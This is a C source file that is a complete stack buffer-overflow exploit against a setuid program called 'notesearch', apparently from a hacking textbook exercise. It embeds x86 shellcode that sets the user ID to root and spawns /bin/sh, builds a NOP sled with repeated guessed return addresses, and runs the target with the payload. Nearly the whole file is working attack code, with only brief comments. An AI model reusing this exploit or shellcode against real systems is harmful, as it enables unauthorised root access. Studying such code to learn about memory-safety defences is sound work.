#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shell_code[] = "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58"
                    "\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51"
                    "\x89\xe2\x53\x89\xe1\xcd\x80";

int main(int argc, char **argv)
{
    unsigned int  i, *ptr, ret, offset;
    char *command, *buffer;

    /* Allocate the memory and zero it. */
    command = (char *)malloc(200);
    bzero(command, 200);
    
    /* Start the command buffer. */
    strcpy(command, "./notesearch \'");
    
    /* Set the buffer pointer at the end of command memory. */
    buffer = command +strlen(command);
    
    /* Set the offset. */
    if(argc > 1)
        offset = atoi(argv[1]);
    else
        offset = 270;    

    /* Set the return address. */
    ret = (unsigned int) &i - offset;
    
    /* Fill the buffer with return address. */
    for(i=0; i < 160; i += 1)
        *((unsigned int *)(buffer + i)) = ret;
    
    /* Build the NOP slead. */
    memset(buffer, 0x90, 60);
    memcpy(buffer+60, shell_code, sizeof(shell_code)-1);
    
    strcat(command, "\'");
    
    /* Run the exploit. */
    system(command);
    free(command);
    
    return 0;     
}
